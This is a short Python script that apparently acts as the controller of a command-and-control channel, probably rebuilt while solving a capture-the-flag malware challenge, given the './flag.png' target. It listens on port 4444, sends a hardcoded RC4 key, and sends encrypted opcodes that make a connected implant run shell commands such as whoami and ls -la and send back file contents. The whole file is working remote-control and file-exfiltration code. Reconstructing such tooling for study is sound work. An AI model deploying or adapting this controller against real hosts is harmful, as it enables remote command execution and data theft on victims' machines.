import socket

# HOST = '127.0.0.1'
HOST = '192.168.183.1'
PORT = 4444
KEY = b"meowmeOwme0wme0w"

def enc_rc4(data: bytes, key=KEY) -> bytes:
    S = list(range(256))
    j = 0
    out = bytearray()
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    i = j = 0
    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        K = S[(S[i] + S[j]) % 256]
        out.append(byte ^ K)
    return bytes(out)

def enc_n_send(sock: socket.socket, data: bytes):
    encrypted_data = enc_rc4(data)
    sock.send(len(encrypted_data).to_bytes(4, byteorder='little'))
    sock.send(encrypted_data)

def exec_client(conn, command: str):
    enc_n_send(conn, b"\x02" + command.encode())
    resp_len = int.from_bytes(conn.recv(4), byteorder='little')
    response = enc_rc4(conn.recv(resp_len))
    print("Response from client:", response)
    return response

def read_client(conn, path):
    enc_n_send(conn, b"\x03" + path.encode())
    resp_len = int.from_bytes(conn.recv(4), byteorder='little')
    response = enc_rc4(conn.recv(resp_len))
    print("Response from client:", response.hex())
    return response

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen()
    print(f"Server listening on {HOST}:{PORT}...")
    conn, addr = s.accept()
    with conn:
        print(f"Connected by {addr}")
        conn.send(KEY)
        enc_n_send(conn, b"\x01")
        exec_client(conn, "whoami")
        exec_client(conn, "pwd")
        exec_client(conn, "ls -la")
        read_client(conn, "./flag.png")
        enc_n_send(conn, b"\x04")
        conn.recv(4)  # Acknowledge exit